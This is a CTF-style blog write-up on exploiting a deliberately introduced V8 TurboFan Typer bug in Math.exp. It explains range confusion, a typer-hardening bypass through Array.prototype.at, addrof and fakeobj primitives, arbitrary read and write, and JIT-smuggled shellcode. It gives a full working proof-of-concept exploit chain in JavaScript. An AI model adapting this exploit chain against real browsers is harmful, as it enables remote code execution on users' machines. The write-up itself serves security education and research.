---
title: "How2Exploit: The Way to Exploit a V8 Typer Bug"
date: 2026-03-20 00:00:00 +0800
categories: [Browser Exploitation, Chrome]
tags: [Chrome Exploitation, Browser Exploitation, CTF]
---

In this blog, we will discuss how to exploit vulnerabilities related to the **Typer** component in V8. During the optimization process, **Typer** is the phase responsible for inferring and assigning data types to nodes in the IR graph (the “Sea of Nodes”), enabling the generation of optimized machine code. It operates in the early stages of optimization to determine, for example, whether a variable is a Small Integer (Smi), a number, or a string, allowing subsequent phases to eliminate expensive type checks.

Therefore, **Typer** is a potentially vulnerable component in V8, as it can inadvertently skip critical checks, leading to exploitable conditions. We will analyze a V8 binary containing a **Typer** vulnerability that can turn a `Type Confusion` bug into an `Out-Of-Bounds` condition. From there, we can achieve arbitrary code execution and ultimately obtain a shell.

We use a V8 version at commit `6538a20aa097f9c05ead98eb88c71819aa1e65aa`. You will need to build the release version with the provided `v8.patch` file below. Alternatively, the original challenge can be found [here](https://dreamhack.io/wargame/challenges/937) if you prefer not to build it yourself.

```diff
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index d18767f957a..a521a0965fd 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1730,8 +1730,9 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return t->cache_->kIntegerOrMinusZeroOrNaN;
     // Unary math functions.
     case Builtin::kMathAbs:
-    case Builtin::kMathExp:
       return Type::Union(Type::PlainNumber(), Type::NaN(), t->zone());
+    case Builtin::kMathExp:
+      return Type::PlainNumber();
     case Builtin::kMathAcos:
     case Builtin::kMathAcosh:
     case Builtin::kMathAsin:
```

## Understanding the Bug

Look at this patch file, we changed `Builtin::kMathExp` to determine the scope of `Type::PlainNumber()` instead of `Type::Union(Type::PlainNumber(), Type::NaN(), t->zone())`. So, what problem does this cause?. When Turbofan optimizes `Builtin::kMathExp`, it will always predict the range of `Builtin::kMathExp` to be `Type::PlainNumber()`. If `Math.exp(x)` results in `NaN` and we compare it to `Object.is` to see if it is equal to `NaN`, we can expect that `Math.exp(x)` will be optimized to **False** since `Type::PlainNumber() != NaN` during the optimization process.

To make this easier to understand, consider the following code snippet.

```js
function opt(x){ 
    return Object.is(Math.exp(x), NaN);
}

print("---- Before Optimization ----");
print(opt("a"));

for (let i = 0; i < 100000; i++) {
    opt(1);
    opt("a");
}

print("---- After Optimization ----");
print(opt("a"));
```
Run `./x64.release/d8 trigger.js`. We observe the following result.

```
---- Before Optimization ----
true
---- After Optimization ----
false
```

When “a” is passed to `Math.exp()`, it returns `NaN` since “a” is not a valid number. Therefore, under normal circumstances, `Object.is()` should return **True** when comparing against `NaN`. However, after optimization, TurboFan incorrectly infers the type as `PlainNumber()` instead of `NaN`, causing it to return **False**. At this point, we have successfully triggered a type confusion bug.

## Leverage the Bug
Since this **type confusion** bug is relatively simple and does not have a significant impact on its own, we need to leverage it in order to make it exploitable. One way to extend this **type confusion** is through **range confusion**. In essence, **range confusion** refers to creating a different between the range inferred by TurboFan and the actual runtime value of the object.

The following code demonstrates how we perform this transformation.
```js
function opt(x){                 //     actual value        turbofan think    
    let i = Math.exp(x);         //     NaN                 PlainNumber
    i = Math.sign(i);            //     -2^31               (-1, 1)
    i = Math.abs(i);             //     2^31                (0,  1)
    i = i>>>30;                  //     2                   (0,  0)
    i = i>>1;                    //     1                   (0,  0)

    return i;
}



for (var i = 0; i < 100000; i++) {
    opt(1);
    opt("a");
}

print(opt("a"));
```

I will explain this in detail later. Let run this code by command `./x64.release/d8 --trace-turbo exploit1.js` and you will get 2 files: `turbo-opt-0.json` and `turbo-opt-1.json`. This occurs because, during execution, the code goes through optimization and then deoptimization due to the presence of two different input types: “a” and Number. It is then optimized again, as only these two types are observed. Therefore, we will select the latest JSON file `turbo-opt-1.json`. You can examine this process in more detail using the following command `./x64.release/d8 --trace-turbo --trace-deopt --trace-opt exploit1.js`.

Load the JSON file into Turbolizer to analyze the process and how values evolve. Navigate to the Typer phase, and you will see a view similar to the one shown below.

![](range_turbo1.png)

Click on the “T” icon to display detailed information, and type “r” to reveal all nodes. After rearranging, we obtain the following view.

![](range_turbo2.png)

Looking at the left side of the image, we can see that **TurboFan** predicts the range as the process below.
- `JSCall` – The node is inferred to return a PlainNumber (this is the bug caused by incorrect type inference in Typer).
- `NumberSign` – This node extracts the sign of the PlainNumber, so the expected range is [-1, 1] (corresponding to Math.sign).
- `NumberAbs` – This node converts negative values to positive, resulting in a range of [0, 1] (corresponding to Math.abs).
- `SpeculativeNumberShiftRightLogical` – Performs an unsigned right shift by 30 bits, yielding a range of [0, 0].
- `SpeculativeNumberShiftRight` – Performs a signed right shift by 1 bit, maintaining the range at [0, 0].

However, if the actual value is `NaN` rather than a `PlainNumber`, the resulting behavior will differ from the inferred range. To observe the actual machine-level operations after the optimization pipeline, we move to the `TFSimplifiedLowering` phase and examine the corresponding transformations.

![](range_turbo3.png)

Figure above illustrates a diagram that extracts only the important parts of that part. When `NaN` comes into a function that TurboFan has optimized, it performs the operations below.

- `JSCall` – Returns `NaN`.
- `ChangeTaggedToFloat64` – The node receives NaN as input, which is represented in IEEE 754 format (e.g., 0x?111111?????????). If you don't know, there exists a range in IEEE 754 that does not map to any real number, which is represented as `NaN`. The subsequent `Float64LessThan` nodes (nodes 95 and 96) check whether the value is greater than or less than zero. These two nodes correspond to the checks x < 0 and x > 0 in the `Math.sign` function. 
- `Float64LessThan` – At the assembly level (e.g., vucomisd xmm1, xmm0), comparisons involving `NaN` always return false according to the IEEE 754 standard. As a result, `NaN` propagates to the next stage, `ChangeFloat64ToInt32`.
- `ChangeFloat64ToInt32` – The `NaN` value is converted using the instruction `vcvttsd2si rcx, xmm0`, which results in 0x80000000 being stored in rcx. According to the [Intel](https://github.com/tpn/pdfs/blob/master/Intel%2064%20and%20IA-32%20Architectures%20Software%20Developer's%20Manual%20-%20Combined%20Volumes%201-4%20-%20May%202019%20(325462-sdm-vol-1-2abcd-3abcd).pdf) specification, when `NaN` is converted using the `vcvttsd2si` instruction, it results in the smallest signed integer value (-2^31, i.e., 0x80000000).
    ![](vcvttsd2si.png)
- `Word32Sar` (Node 101) – Performs `0x80000000 >> 31`, resulting in `0xffffffff` (arithmetic right shift). A mask-based trick to convert a negative number into a positive one.
- `Word32Xor` – Computes `0x80000000 ^ 0xffffffff = 0x7fffffff`.
- `Int32Sub` – Computes `0x7fffffff - 0xffffffff = 0x80000000`. Done `Math.abs()`.
- `Word32Shr` – Performs `0x80000000 >>> 30 = 0x00000002`.
- `Word32Sar` (Node 63) – Performs `0x00000002 >> 1 = 0x00000001`.
- `ChangeInt31ToTaggedSigned` – Converts `0x00000001` into a tagged integer, resulting in the final value 1.

In conclusion, `Turbolizer` might predict Range(0, 0), but the actual value is 1.

## Typer Hardening Bypass
At this point, we understand the mechanism and how to extend type confusion into range confusion. However, that alone is not enough to achieve an OOB array. 

V8 uses a flag called `CheckBoundsFlag::kAbortOnOutOfBounds` to differentiate between when it's okay to have an OOB and when it's not. To understand this, let's analyze the code in figure below.

```c++
Reduction TypedOptimization::ReduceMaybeGrowFastElements(Node* node) {
  Node* const elements = NodeProperties::GetValueInput(node, 1);
  Node* const index = NodeProperties::GetValueInput(node, 2);
  Node* const length = NodeProperties::GetValueInput(node, 3);
  Node* const effect = NodeProperties::GetEffectInput(node);
  Node* const control = NodeProperties::GetControlInput(node);

  Type const index_type = NodeProperties::GetType(index);
  Type const length_type = NodeProperties::GetType(length);
  CHECK(index_type.Is(Type::Unsigned31()));
  CHECK(length_type.Is(Type::Unsigned31()));

  if (!index_type.IsNone() && !length_type.IsNone() &&
      index_type.Max() < length_type.Min()) {                             // [1]
    Node* check_bounds = graph()->NewNode(
        simplified()->CheckBounds(FeedbackSource{},
                                  CheckBoundsFlag::kAbortOnOutOfBounds),
        index, length, effect, control);
    ReplaceWithValue(node, elements, check_bounds);
    return Replace(check_bounds);
  }

  return NoChange();
}
```

`ReduceMaybeGrowFastElements` is a function that optimizes the `MaybeGrowFastElements` node, which is used when an array’s size may grow. If the condition `index_type.Max() < length_type.Min()` holds, then the index is guaranteed to always be smaller than the array length, meaning all accesses are in-bounds, and in theory, a `CheckBounds` node would not be necessary.

However, to guard against potential TurboFan misoptimizations, a `CheckBounds` node is still created with the flag `CheckBoundsFlag::kAbortOnOutOfBounds` and inserted via `ReplaceWithValue`. This acts as a safety net in cases where the type analysis assumes `index_type.Max() < length_type.Min()`, but at runtime the actual input violates this assumption and results in `index >= length`. If such a case occurs after optimization by `ReduceMaybeGrowFastElements`, the inserted `CheckBounds` will detect it. 

Since this `CheckBounds` uses the `kAbortOnOutOfBounds` flag, it is considered unreachable in normal execution, and TurboFan lowers it to an `int 3` trap when triggered, stop program immediately. This is called **Typer Hardening**, and we need to bypass it.

Since **Typer Hardening** bypasses are considered critical issues in V8, they tend to be patched quickly; however, new bypass techniques are continuously being discovered. The technique we will use is issue `1342115 – V8 Typer Hardening bypass via ReduceArrayPrototypeAt`. This bug was patched, in June 2023, under the update titled [[compiler] add more typer hardening](https://chromium-review.googlesource.com/c/v8/v8/+/4454339). However, based on the [commit](https://chromium.googlesource.com/v8/v8/+/4217c51611830d98d7fd7b8c922571942a87ad2e/include/v8-version.h), we can see that the patched V8 version is 11.6.0.0, while the version used in this challenge is 11.2.214.14. Therefore, we can still use this technique to bypass **Typer Hardening**.

Now, let’s take a look at `ReduceArrayPrototypeAt()` before it was patched and see how it works.

```c++
TNode<Object> IteratingArrayBuiltinReducerAssembler::ReduceArrayPrototypeAt(
    ZoneVector<MapRef> maps, bool needs_fallback_builtin_call) {
  TNode<JSArray> receiver = ReceiverInputAs<JSArray>();
  TNode<Object> index = ArgumentOrZero(0);

  TNode<Number> index_num = CheckSmi(index);
  TNode<FixedArrayBase> elements = LoadElements(receiver);

  TNode<Map> receiver_map =
      TNode<Map>::UncheckedCast(LoadField(AccessBuilder::ForMap(), receiver));

  auto out = MakeLabel(MachineRepresentation::kTagged);

  for (MapRef map : maps) {
    DCHECK(map.supports_fast_array_iteration(broker()));
    auto correct_map_label = MakeLabel(), wrong_map_label = MakeLabel();
    TNode<Boolean> is_map_equal = ReferenceEqual(receiver_map, Constant(map));
    Branch(is_map_equal, &correct_map_label, &wrong_map_label);
    Bind(&correct_map_label);

    TNode<Number> length = LoadJSArrayLength(receiver, map.elements_kind());

    // If index is less than 0, then subtract from length.
    TNode<Boolean> cond = NumberLessThan(index_num, ZeroConstant());
    TNode<Number> real_index_num =
        SelectIf<Number>(cond)
            .Then(_ { return NumberAdd(length, index_num); })
            .Else(_ { return index_num; })
            .ExpectTrue()  // Most common usage should be .at(-1)
            .Value();

    // Bound checking.
    GotoIf(NumberLessThan(real_index_num, ZeroConstant()), &out,
           UndefinedConstant());
    GotoIfNot(NumberLessThan(real_index_num, length), &out,
              UndefinedConstant());

    // Retrieving element at index.
    TNode<Object> element = LoadElement<Object>(
        AccessBuilder::ForFixedArrayElement(map.elements_kind()), elements,
        real_index_num);
    if (IsHoleyElementsKind(map.elements_kind())) {
      // This case is needed in particular for HOLEY_DOUBLE_ELEMENTS: raw
      // doubles are stored in the FixedDoubleArray, and need to be converted to
      // HeapNumber or to Smi so that this function can return an Object. The
      // automatic converstion performed by
```

- Line 4: Inserts the arguments entered in `prototype.at()` into `index`.
- Line 21: Get length from`JSArrayLength` and save it to `length`.
- Line 24: Determines the direction based on the sign of index, gets the index of the actual array, and stores it in `real_index_num`. `.at()` function allows negative indices, unlike normal arrays.
- Line 33: Check if `real_index_num` obtained from length exceeds the range of.
- Line 40: If it doesn't exceed, get the actual argument via this line.

Obviously, step 4 contains the syntax to check for out-of-bounds, so it looks like there's no problem, Right?. Nah, no. `GotoIf` and `GotoIfNot` can be eliminated by later optimizations, unlike `CheckBounds`. This is because both are **branch** nodes, and if the optimizer determines that their conditions are always satisfied (i.e., always evaluate to true or false), they become redundant and can be removed during optimization.

So, if you give us a value as input that has been manipulated with range confusion, the subsequent optimization will remove the `GotoIf` and `GotoIfNot` syntax and actually allow `OOB`. Therefore, in the patch, they added a `CheckBounds` as follows.

```c++
if (v8_flags.turbo_typer_hardening) {
      real_index_num = CheckBounds(real_index_num, length,
                                   CheckBoundsFlag::kAbortOnOutOfBounds);
    }
```

Now, we combine `range confusion` with a `Typer Hardening bypass` to achieve an OOB. Let’s run the code below with command `./x64.release/d8 --trace-turbo exploit2.js`. 
```js
function opt(x, obj){                            //     actual                turbofan    
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [1.1, 1.1];
    var arr2 = [obj, obj, obj, obj, obj, obj, obj, obj, obj, obj];
    
//    print("arr info");
//    %DebugPrint(arr);
//    print("arr2 info");
//    %DebugPrint(arr2);

    return [
        arr,
        arr2,
        arr.at(i * 8),
        arr2.at(0) // prevent arr2 being deoptimized
    ];
}


for (var i = 0; i < 100000; i++) {
    opt(1);
    opt("a");
}

print(opt("a"));
```

You might wonder what `%DebugPrint` is used for. It’s a rather dirty trick I use to quickly find the offset between `arr` and `arr2`, so I can determine at which index `arr2` is located relative to `arr` by pressing `Ctrl+C` to interrupt execution and inspect the output, hehe. And `arr2[1]` is located at `arr[8]`.

Back to the main part, after running it, we load `turbo-opt-1.json` into Turbolizer. Do the same as before, then navigate to the `TFLoadElimination` phase. Click on all the arrows corresponding to `arr.at(i * 8)` in the code section. Rearrange the graph, and you’ll get the part shown below.”

![](typerha_turbo1.png)

We see `node 153`, `node 277`, and then `(i * 8)` are used to check whether the number is an SMI. As we mentioned in the previous Range Confusion, we can see that the range is `Range(0, 0)`. 

The element we loaded from `node 308` then flows into `Phi[kRepTagged]`, which is node 306. We can see that its type is `Number | Undefined`. This is because it is connected to `node 283`, `node 284`, and `node 304`, which handle the `GotoIf` and `GotoIfNot` processes of `IteratingArrayBuiltinReducerAssembler::ReduceArrayPrototypeAt`. If `GotoIf` or `GotoIfNot` satisfies the conditions, the value becomes `Undefined`; otherwise, a `Number` is stored in the array by `node 316`.

So what are the conditions for removing these two branches? 
- `GotoIf`: To satisfy the condition, `real_index_num` must be >= 0 always. Because Turbofan always assumes that the range is within `[0, 0]`, this condition is guaranteed to be satisfied.
- `GotoIfNot`: To satisfy the condition, `real_index_num` must be < `length` always. Since, like in the above branch, `real_index_num` is always assumed to be 0, it also easily satisfies this elimination condition.

Therefore, with the help of `range confusion`, we are able to bypass `type hardening` by eliminating these two checks. To verify this, let’s move to the `TFEarlyOptimization` and perform the same steps as above.

![](typerha_turbo2.png)

At `node 153`, we can observe that `(i * 8)`effectively performs the same operation. The resulting value is then passed as input to `node 308` to access the element. Up to this point, everything behaves similarly to the earlier stages. However, unlike in the `TFLoadElimination` phase, where `Phi[kRepTagged]` would re-check for `Number | Undefined`. This time the execution flows directly to `node 560` to perform `ChangeFloat64ToTagged`.

This happens because the optimizer has concluded that the `Undefined` case is impossible, and therefore eliminates that branch entirely.

As a result, this can be leveraged to achieve OOBs access.

## AddrOf
Based on what we just discussed, we can create an **OOB read** by making a primitive called `addrof`. We'll do this by creating an array with `PACKED_DOUBLE_ELEMENTS`, then making another array below it to put an object in, and then using the **OOB read** to get the object's information into a `DOUBLE`. The code looks like this. Run `./x64.release/d8 --allow-natives-syntax exploit3.js`

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function AddrOf(x, obj){                         //     actual                turbofan    
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [1.1, 1.1];
    var arr2 = [obj, obj, obj, obj, obj, obj, obj, obj, obj, obj];

    return [
      arr.at(i * 8),
      arr2.at(0) // prevent arr2 being deoptimized 
    ];
}

object = {};
gc();
gc();

for (var i = 0; i < 100000; i++) {
    AddrOf(1, object);
    AddrOf("a", object);
}

vic = AddrOf("a", object);
print(hex(hi32(ftoi(vic[0]))));
%DebugPrint(object);
```
From the result, we have successfully leaked the compressed address of the `object`.

```shell
0x2c9b7d
DebugPrint: 0x1e62002c9b7d: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x1e6200184845 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1e6200184a11 <Object map = 0x1e620018404d>
 - elements: 0x1e62000001c9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1e62000001c9 <FixedArray[0]>
 - All own properties (excluding elements): {}
0x1e6200184845: [Map] in OldSpace
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 4
 - enum length: invalid
 - back pointer: 0x1e6200000201 <undefined>
 - prototype_validity cell: 0x1e620000171d <Cell value= 1>
 - instance descriptors (own) #0: 0x1e62000009c5 <DescriptorArray[0]>
 - prototype: 0x1e6200184a11 <Object map = 0x1e620018404d>
 - constructor: 0x1e6200184555 <JSFunction Object (sfi = 0x1e6200152ef9)>
 - dependent code: 0x1e62000001d9 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

## FakeObj
To exploit further, we need an **OOB write**. However, `Array.prototype.at()` can only read object data, so we can’t directly use it to achieve arbitrary write. Instead, we need to create a `fakeobj`.

First, we need to create an object that stores our `fake_object` inside its element area. The structure of that `fake_object` is as follows:

```js
var objContain_fakeobj = [
    itof(0x0000000000000000n | 0x0000000000000000n), // prop    | map           -> fake_object
    itof(0x0000fffe00000000n | 0x0000000000000000n), // length  | elements
    itof(0x1c04040400000061n),                       //                         -> fake map
    itof(0x0a0007ff1100083fn),
    itof(0x7ffffffe00000000n | 0x0000000000000000n), // length  | unused        -> fake element
    itof(0x1234123412341234n),
];
```

You can read my old blog to better understand the structure of objects and elements.

Next, we need to make the program recognize our `fake_object` by creating a function called `FakeObj`. The difference from `AddrOf` is that we create the array with `PACKED_ELEMENTS` instead of `PACKED_DOUBLE_ELEMENTS`, so it is treated as an object rather than a number. We also need another array placed below it to store the `fake_object` we pass in. When we put the `fake_object` into `arr2` and use `arr` to read and return it, the program successfully recognizes our `fake_object`. We have the code below.

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function AddrOf(x, obj){                         //     actual                turbofan    
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [1.1, 1.1];
    var arr2 = [obj, obj, obj, obj, obj, obj, obj, obj, obj, obj];

    return [
      arr.at(i * 8),
      arr2.at(0) // prevent arr2 being deoptimized 
    ];
}


function FakeObj(x, addr){                       //     actual                turbofan
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [[], []];
    var arr2 = [addr, addr, addr, addr, 1.1];
    return [arr.at(i * 8), arr, arr2];
}

var objContain_fakeobj = [
    itof(0x0000000000000000n | 0x0000000000000000n), // prop    | map           -> fake_object
    itof(0x0000fffe00000000n | 0x0000000000000000n), // length  | elements
    itof(0x1c04040400000061n),                       //                         -> fake map
    itof(0x0a0007ff1100083fn),
    itof(0x7ffffffe00000000n | 0x0000000000000000n), // length  | unused        -> fake element
    itof(0x1234123412341234n),
];

gc();
gc();

for (var i = 0; i < 1000000; i++) {
    AddrOf(1, objContain_fakeobj);
    FakeObj(1, 1.1);
    AddrOf("a", objContain_fakeobj);
    FakeObj("a", 1.1);
}

objContain_fakeobj_addr = hi32(ftoi(AddrOf("a", objContain_fakeobj)[0]));
print("[+] Object contain fakeobj address: " + hex(objContain_fakeobj_addr));

objContain_fakeobj_element0_addr = objContain_fakeobj_addr + 0x18n;
print("[+] Object contain fakeobj element 0 address: " + hex(objContain_fakeobj_element0_addr));

fakeobj_address = objContain_fakeobj_element0_addr;
print("[+] fake object address: " + hex(fakeobj_address));

fakeobj_map_address = fakeobj_address + 0x10n;
print("[+] fake object map address: " + hex(fakeobj_map_address));

fakeobj_element_address = fakeobj_address + 0x20n;
print("[+] fake object element address: " + hex(fakeobj_element_address));

objContain_fakeobj[0] = itof( 0x0000000000000000n | (fakeobj_map_address));
objContain_fakeobj[1] = itof( 0x07fffffe00000000n | (fakeobj_element_address));
oob = FakeObj("a", itof(fakeobj_address))[0];

print("[+] oob[0]: " + hex(ftoi(oob[0])));
```

Let me explain it to you. First, we need to leak the address of `objContain_fakeobj` via `AddrOf`. Then, we calculate the address of `objContain_fakeobj[0]`. This `objContain_fakeobj[0`] is also the location where our `fake_object` is stored.

Based on the structure of the `fake_object`, we can calculate the addresses of the `fake map` and `fake elements`. Then, we place these addresses into our `fake_object` structure to complete it.

We then pass the address of the `fake_object` into the `FakeObj` function. In this function, `arr` uses the OOB bug to read the `fake_object` address from `arr2`, treats it as a real object, and returns it to us as a valid object. At this point, the program has successfully recognized our `fake_object`. If we check again using `oob[0]`, we can see it returns the value we stored earlier, which means the elements of the `fake_object` can now be accessed successfully.

![](fakeobj_ele.png)

## RCE

After all that hard work, we finally get an OOB array with a very large length, `0x7ffffffe`, called `oob`. With this `oob` array, exploitation becomes much easier and clearer. From this `oob`, we can rebuild the `AddrOf`, `CAW/CAR` (cage arbitrary read/write), `rw_u8`, and a `foo` function that contains shellcode. The exact method to continue the exploitation is described in this [blog](https://kain1k.github.io/posts/oob-array/).

And here is our final PoC.
```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0] = val;
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function AddrOf(x, obj){                         //     actual                turbofan    
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [1.1, 1.1];
    var arr2 = [obj, obj, obj, obj, obj, obj, obj, obj, obj, obj];
    
    return [
      arr.at(i * 8),
      arr2.at(0) // prevent arr2 being optimized out
    ];
}

function FakeObj(x, addr){                       //     actual                turbofan
    let i = Math.exp(x);                         //     NaN                 PlainNumber
    i = Math.sign(i);                            //     -2^31               (-1, 1)
    i = Math.abs(i);                             //     2^31                (0,  1)
    i = i>>>30;                                  //     2                   (0,  0)
    i = i>>1;                                    //     1                   (0,  0)

    var arr = [[], []];
    var arr2 = [addr, addr, addr, addr, 1.1];
    return [arr.at(i * 8), arr, arr2];
}

function CAW_offset_based(base, victim, value, size){

    idx = Number((victim - base) / 0x8n);
    if (idx < 0 && Number(victim - base) % 0x8)
        idx -= 1;
    if(size == 8) {
        if (Number(victim - base) % 0x8) { //Check alignment. If i != 0, handle it by splitting the value.
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (lo32(value) << 32n));
            oob[idx+1] = itof(hi32(value) + (hi32(ftoi(oob[idx+1])) << 32n));
        }
        else
            oob[idx] = itof(value);
    }

    else if(size == 4) {
        if (Number(victim - base) % 0x8)
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (value << 32n));
        else
            oob[idx] = itof(value + (hi32(ftoi(oob[idx])) << 32n));

    }

}

function CAW(victim, value, size) {
    CAW_offset_based(fakeobj_element_address+0x8n, rw_base_pointer, victim, 8);
    for (let i = 0; i<size; i++) {
        rw_u8[i] = Number(value&0xffn);
        value >>= 8n;
    }
}

function CAR(victim, size) {
    let buf = 0n;
    CAW_offset_based(fakeobj_element_address+0x8n, rw_base_pointer, victim, 4);
    for (let i = 0; i < size; i++) {
        buf += BigInt(rw_u8[i]) << BigInt(8 * i);
    }
    return buf;
}

///////////////////////////

var addrof_dict = [{}];
var objContain_fakeobj = [
    itof(0x0000000000000000n | 0x0000000000000000n), // prop    | map           -> fake_object
    itof(0x0000fffe00000000n | 0x0000000000000000n), // length  | elements
    itof(0x1c04040400000061n),                       //                         -> fake map
    itof(0x0a0007ff1100083fn),
    itof(0x7ffffffe00000000n | 0x0000000000000000n), // length  | unused        -> fake element
    itof(0x1234123412341234n),
];

gc();
gc();

var rw_u8 = new Uint8Array(0x8);    

gc(); 
gc();


for (var i = 0; i < 1000000; i++) {
    AddrOf(1, objContain_fakeobj);
    FakeObj(1, 1.1);
    AddrOf("a", objContain_fakeobj);
    FakeObj("a", 1.1);
}

objContain_fakeobj_addr = hi32(ftoi(AddrOf("a", objContain_fakeobj)[0]));
print("[+] Object contain fakeobj address: " + hex(objContain_fakeobj_addr));

objContain_fakeobj_element0_addr = objContain_fakeobj_addr + 0x18n;
print("[+] Object contain fakeobj element 0 address: " + hex(objContain_fakeobj_element0_addr));

fakeobj_address = objContain_fakeobj_element0_addr;
print("[+] fake object address: " + hex(fakeobj_address));

fakeobj_map_address = fakeobj_address + 0x10n;
print("[+] fake object map address: " + hex(fakeobj_map_address));

fakeobj_element_address = fakeobj_address + 0x20n;
print("[+] fake object element address: " + hex(fakeobj_element_address));

objContain_fakeobj[0] = itof( 0x0000000000000000n | (fakeobj_map_address));
objContain_fakeobj[1] = itof( 0x07fffffe00000000n | (fakeobj_element_address));
oob = FakeObj("a", itof(fakeobj_address))[0];

print("[+] oob[0]: " + hex(ftoi(oob[0])));

function AddrOf_offset_based(obj){
    addrof_dict[0] = obj;
    return ftoi(oob[2]) & 0xffffffffn
}


rw_addr = AddrOf_offset_based(rw_u8) - 0x1n;
print("[+] rw address: " + hex(rw_addr));

rw_base_pointer = rw_addr + 0x34n;
rw_external_pointer = rw_addr + 0x2cn;
// change external_pointer to 0
CAW_offset_based(fakeobj_element_address+0x8n, rw_external_pointer, 0x0n, 4);

print("[+] base pointer: "+ hex(rw_base_pointer));

const foo = ()=>
{
    return [1.0,
        1.95538254221075331E-246,
        1.95606125582421467E-246,
        1.99957147195425773E-246,
        1.95337673326740932E-246,
        2.63486047652296056E-284]
}

gc(); 
gc();

for (let i = 0; i < 0x10000; i++) {
    foo();foo();foo();foo();
}

foo_addr = AddrOf_offset_based(foo) - 0x1n;
print("[+] foo address: " + hex(foo_addr));

foo_code_addr = foo_addr + 0x18n;
print("[+] foo code address: " + hex(foo_code_addr));

foo_code_addr_value = CAR(foo_code_addr, 4) - 1n;
print("[+] foo code address value: " + hex(foo_code_addr_value));

code_entry_point = foo_code_addr_value + 0x8n;
print("[+] turbofan instruction code object address: " + hex(code_entry_point));

exec_instruction_addr = CAR(code_entry_point, 8);
print("[+] executable instruction address: " + hex(exec_instruction_addr));

CAW(code_entry_point, exec_instruction_addr+0x78n, 8);
exec_instruction_addr = CAR(code_entry_point, 8);
print("[+] changed executable instruction address: " + hex(exec_instruction_addr));

foo();
```

![](typer_poc.png)

As a side note, when I first ran my PoC, I noticed the exploit was unstable and the success rate was quite low. After investigating, I found that the elements of the first two `objects` were somehow placed far apart, leading to incorrect OOB reads. I suspect this comes from the compaction mechanism in the Major GC’s Mark-Sweep-Compact phase. When the subsequent `objects` are moved to `Old Space`, the engine may detect memory fragmentation and trigger compaction to reorganize memory. This can unintentionally break our expected layout. To mitigate this, I strategically added more `gc()` calls in the final `PoC` to force early promotion in smaller chunks, which stabilizes the layout and significantly improves the success rate.

`Hope you "enjoy" !!!`
